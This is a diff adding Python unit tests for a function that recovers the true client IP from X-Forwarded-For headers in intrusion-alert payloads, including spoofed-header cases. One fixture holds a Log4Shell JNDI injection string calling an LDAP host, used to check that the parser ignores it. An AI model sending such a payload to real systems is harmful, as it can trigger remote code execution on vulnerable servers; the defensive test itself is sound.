@@ -7,6 +7,7 @@ from app.database.models import (
     build_process_info,
     clean_byte_string,
     determine_heartbeat_status,
+    extract_forwarded_info,
     format_relative_time,
     grouped_alert_to_response,
     process_additional_data,
@@ -540,6 +541,74 @@ def test_process_additional_data_byte_string_formats():
 def test_process_additional_data_empty():
     assert process_additional_data([]) == {}
     assert process_additional_data(None) == {}
+
+
+# --- Tests for extract_forwarded_info ---
+
+
+_HTTP_REQUEST = (
+    "GET /?s=1 HTTP/1.1\r\n"
+    "Host: ls-pool.example.de\r\n"
+    "User-Agent: Mozilla/5.0\r\n"
+    "Via: 1.1 __PROXY__ (squid)\r\n"
+    "X-Forwarded-For: 85.190.234.119\r\n"
+    "\r\n"
+)
+
+
+def test_extract_forwarded_info_bytes_payload():
+    rows = [MockRow(meaning="Payload", type="byte-string", data=_HTTP_REQUEST.encode())]
+    info = extract_forwarded_info(rows)
+    assert info is not None
+    assert info.true_source == "85.190.234.119"
+    assert info.forwarded_for == ["85.190.234.119"]
+    assert info.via_proxy == "1.1 __PROXY__ (squid)"
+
+
+def test_extract_forwarded_info_byte_repr_string_payload():
+    # Prelude often delivers the payload as a b'...'-repr string, not real bytes.
+    rows = [
+        MockRow(meaning="Payload", type="string", data=repr(_HTTP_REQUEST.encode()))
+    ]
+    info = extract_forwarded_info(rows)
+    assert info is not None
+    assert info.true_source == "85.190.234.119"
+    assert info.via_proxy == "1.1 __PROXY__ (squid)"
+
+
+def test_extract_forwarded_info_prefers_rightmost_global_over_spoof():
+    # Attacker prepends a spoofed public IP; the trusted proxy appends the real one.
+    payload = "GET / HTTP/1.1\r\nX-Forwarded-For: 8.8.8.8, 85.190.234.119\r\n\r\n"
+    rows = [MockRow(meaning="Payload", type="byte-string", data=payload.encode())]
+    info = extract_forwarded_info(rows)
+    assert info.forwarded_for == ["8.8.8.8", "85.190.234.119"]
+    assert info.true_source == "85.190.234.119"
+
+
+def test_extract_forwarded_info_all_private_falls_back_to_rightmost():
+    payload = "GET / HTTP/1.1\r\nX-Forwarded-For: 10.0.0.5, 192.168.1.10\r\n\r\n"
+    rows = [MockRow(meaning="Payload", type="byte-string", data=payload.encode())]
+    info = extract_forwarded_info(rows)
+    assert info.true_source == "192.168.1.10"
+
+
+def test_extract_forwarded_info_ignores_weaponized_jndi_header():
+    # Real-world Log4Shell scans overwrite X-Forwarded-For with a JNDI payload.
+    # The embedded IP is the attacker's LDAP callback host, NOT a client — must
+    # never be attributed. Expect no recovery rather than a wrong one.
+    payload = (
+        "GET / HTTP/1.1\r\n"
+        "X-Forwarded-For: ${jndi:ldap://localhost#192.168.232.250:16287/a}\r\n\r\n"
+    )
+    rows = [MockRow(meaning="payload", type="byte-string", data=payload.encode())]
+    assert extract_forwarded_info(rows) is None
+
+
+def test_extract_forwarded_info_none_when_absent():
+    rows = [MockRow(meaning="Payload", type="byte-string", data=b"GET / HTTP/1.1\r\n")]
+    assert extract_forwarded_info(rows) is None
+    assert extract_forwarded_info([]) is None
+    assert extract_forwarded_info(None) is None
 
 
 # --- Tests for format_relative_time ---
